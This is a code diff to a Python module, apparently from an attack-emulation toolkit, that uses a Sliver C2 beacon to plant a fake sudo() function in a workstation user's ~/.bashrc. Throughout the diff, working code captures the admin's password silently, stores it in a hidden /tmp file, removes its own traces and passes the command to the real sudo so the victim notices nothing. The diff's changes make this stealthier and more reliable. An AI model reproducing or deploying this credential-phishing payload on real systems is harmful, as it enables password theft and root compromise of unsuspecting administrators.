@@ -3,15 +3,17 @@ from chainlog import log
 from advanced_initial_access import sliver_exec
 
 # =============================================================================
-# vinzenzws_privesc.py — Sudo Phishing via Sliver C2
+# advanced_vinzenzws_privesc.py — Sudo Phishing via Sliver C2
 # MITRE ATT&CK:
 #   T1556.003 - Modify Authentication Process (Sudo Phishing)
 #   T1078     - Valid Accounts (Root access)
 # -----------------------------------------------------------------------------
-# Executes FROM kali, utilizing the sliver beacon running on vinzenz's
-# workstation. It injects a malicious sudo alias into ~/.bash_aliases that 
-# captures the password when the admin runs sudo, sends it to a listener on 
-# kali, and then executes the real sudo.
+# Executes FROM kali, driving the sliver beacon running on vinzenz's
+# workstation. It appends a malicious ``sudo()`` shell function to
+# ~/.bashrc; the function captures the password the next time the admin
+# runs sudo in an interactive shell, writes it to /tmp/.sys_update.lock on
+# the target for later retrieval, then transparently invokes the real
+# /usr/bin/sudo so the admin's command succeeds and they notice nothing.
 # =============================================================================
 
 def run(vinzenz_beacon, kali_host):
@@ -32,38 +34,48 @@ def run(vinzenz_beacon, kali_host):
     """
     log("\n[*] Starting Sudo Phishing on Vinzenz Workstation (T1556.003)...")
 
-    # The Phish payload. 
-    # It prompts like real sudo, reads the password silently, 
-    # sends it to our listener, and then executes the real sudo.
-    # We use a background curl to a port on the Kali machine.
-    payload = f"""sudo() {{
+    # Sentinels delimit the injected block so the self-unhook sed (and any
+    # future external cleanup) deletes only our function -- never
+    # neighbouring user content in ~/.bashrc. The previous range pattern
+    # ``/sudo() {/,/}/`` matched on the next ``}`` anywhere in the file,
+    # which would have clobbered unrelated function bodies.
+    SENTINEL_BEGIN = "# __SUDO_PHISH_BEGIN__"
+    SENTINEL_END   = "# __SUDO_PHISH_END__"
+
+    # The phish payload: prompts like real sudo, reads the password
+    # silently, writes it to /tmp/.sys_update.lock on the target, then
+    # transparently invokes the real /usr/bin/sudo so the admin's command
+    # runs normally and nothing looks wrong on their end.
+    payload = f"""{SENTINEL_BEGIN}
+sudo() {{
     read -rsn1 -p "[sudo] password for $USER: " firstchar
     if [ -z "$firstchar" ]; then echo; /usr/bin/sudo "$@"; return; fi
     read -rs pass
     pass="$firstchar$pass"
     echo
     echo "$pass" > /tmp/.sys_update.lock
-    # Unhook ourselves
-    sed -i '/sudo() {{/,/}}/d' ~/.bashrc 2>/dev/null
+    # Self-unhook: delete only the sentinel-bounded block we injected.
+    sed -i '/^{SENTINEL_BEGIN}$/,/^{SENTINEL_END}$/d' ~/.bashrc 2>/dev/null
     unset -f sudo
-    # Execute the real command
+    # Pass control to the real sudo so the admin's command runs normally.
     echo "$pass" | /usr/bin/sudo -S "$@"
 }}
+{SENTINEL_END}
 """
     
-    log("[*] Injecting malicious sudo alias into ~/.bashrc...")
-    
+    log("[*] Injecting malicious sudo function into ~/.bashrc...")
+
     # Encode payload to base64 to avoid shell escaping issues
     b64_payload = __import__('base64').b64encode(payload.encode()).decode()
     cmd = f"execute -o -- sh -c 'echo \"{b64_payload}\" | base64 -d >> ~/.bashrc'"
-    
+
     out = sliver_exec(vinzenz_beacon, cmd)
     if out and "error" in out.lower():
-        log(f"[-] Failed to inject alias: {out.strip()}")
+        log(f"[-] Failed to inject sudo function: {out.strip()}")
         return {"vinzenz_password_file": None}
-    
-    log(f"[*] Sudo alias injected. The password will be saved to /tmp/.sys_update.lock locally.")
-    log(f"[*] Waiting 45 seconds to ensure the admin triggers the alias...")
+
+    log(f"[*] Sudo function injected. The password will be saved to /tmp/.sys_update.lock locally.")
+    log(f"[*] Waiting 45 seconds to ensure the admin triggers the function...")
     
     __import__('time').sleep(45)
     
